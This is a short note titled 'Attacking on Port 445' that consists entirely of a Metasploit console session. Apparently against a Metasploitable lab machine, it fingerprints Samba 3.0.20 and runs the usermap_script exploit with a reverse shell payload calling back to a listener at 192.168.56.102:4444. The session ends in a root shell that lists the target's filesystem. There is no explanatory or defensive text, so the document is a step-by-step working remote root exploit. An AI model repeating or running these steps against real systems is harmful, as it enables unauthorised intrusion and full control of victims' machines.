# Attacking on Port 445

```

msf > search samba
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                            Disclosure Date  Rank       Description
   ----                                            ---------------  ----       -----------
   auxiliary/admin/smb/samba_symlink_traversal                      normal     Samba Symlink Directory Traversal
   auxiliary/dos/samba/lsa_addprivs_heap                            normal     Samba lsa_io_privilege_set Heap Overflow
   auxiliary/dos/samba/lsa_transnames_heap                          normal     Samba lsa_io_trans_names Heap Overflow
   auxiliary/dos/samba/read_nttrans_ea_list                         normal     Samba read_nttrans_ea_list Integer Overflow
   auxiliary/scanner/rsync/modules_list                             normal     List Rsync Modules
   auxiliary/scanner/smb/smb_uninit_cred                            normal     Samba _netr_ServerPasswordSet Uninitialized Credential State
   exploit/freebsd/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (*BSD x86)
   exploit/linux/samba/chain_reply                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
   exploit/linux/samba/is_known_pipename           2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
   exploit/linux/samba/lsa_transnames_heap         2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
   exploit/linux/samba/setinfopolicy_heap          2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   exploit/linux/samba/trans2open                  2003-04-07       great      Samba trans2open Overflow (Linux x86)

msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf auxiliary(smb_version) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101

msf auxiliary(smb_version) > exploit

[*] 192.168.56.101:445    - Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf auxiliary(smb_version) > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  139              yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(usermap_script) > set RHOST 192.168.56.101
RHOST => 192.168.56.101
msf exploit(usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.56.101   yes       The target address
   RPORT  139              yes       The target port (TCP)

sf exploit(usermap_script) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.56.101   yes       The target address
   RPORT  139              yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.102   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(usermap_script) > set RPORT 445
RPORT => 445
msf exploit(usermap_script) > exploit

[*] Started reverse TCP double handler on 192.168.56.102:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 5uDAtPebdfpQV9fS;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "5uDAtPebdfpQV9fS\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 4 opened (192.168.56.102:4444 -> 192.168.56.101:36867) at 2018-05-22 06:15:08 +0000

whoami
root
time

real	0m0.000s
user	0m0.000s
sys	0m0.000s
du
4	./initrd
4	./media/floppy0
4	./media/cdrom0
12	./media
4028	./bin
16	./lost+found
4	./mnt/newdisk
8	./mnt
6712	./sbin
16	./home/service
4	./home/ftp
12	./home/user/.ssh
32	./home/user
28108	./home/msfadmin/vulnerable/samba/3.0.20/debs
45012	./home/msfadmin/vulnerable/samba/3.0.20
27472	./home/msfadmin/vulnerable/samba/3.0.6/debs
42192	./home/msfadmin/vulnerable/samba/3.0.6
356	./home/msfadmin/vulnerable/samba/deps
87564	./home/msfadmin/vulnerable/samba
36	./home/msfadmin/vulnerable/mysql-ssl/mysql-keys
984	./home/msfadmin/vulnerable/mysql-ssl
228	./home/msfadmin/vulnerable/twiki20030201/twiki-source/bin
36	./home/msfadmin/vulnerable/twiki20030201/twiki-source/lib/TWiki/Plugins
64	./home/msfadmin/vulnerable/twiki20030201/twiki-source/lib/TWiki/Store



```



